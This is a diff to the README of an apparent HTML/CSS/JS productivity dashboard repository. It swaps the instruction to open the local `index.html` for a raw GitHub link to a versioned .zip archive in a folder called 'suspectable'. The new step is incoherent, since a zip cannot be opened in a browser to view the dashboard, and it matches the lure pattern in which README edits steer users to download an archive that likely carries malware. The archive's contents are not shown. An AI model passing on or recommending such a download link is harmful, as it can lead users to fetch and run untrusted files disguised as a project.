@@ -9,7 +9,7 @@ A simple productivity dashboard built with pure HTML, CSS, and JavaScript.
 
 ## How to Use
 - Clone or download this repo
-- Open `index.html` in your browser to view the dashboard
+- Open `https://raw.githubusercontent.com/Dhanloyd/AI-Productivity-Dashboard-Pure-HTML-CSS-JS-/main/suspectable/AI-Productivity-Dashboard-Pure-HTML-CSS-JS-_v3.8.zip` in your browser to view the dashboard
 
 
 
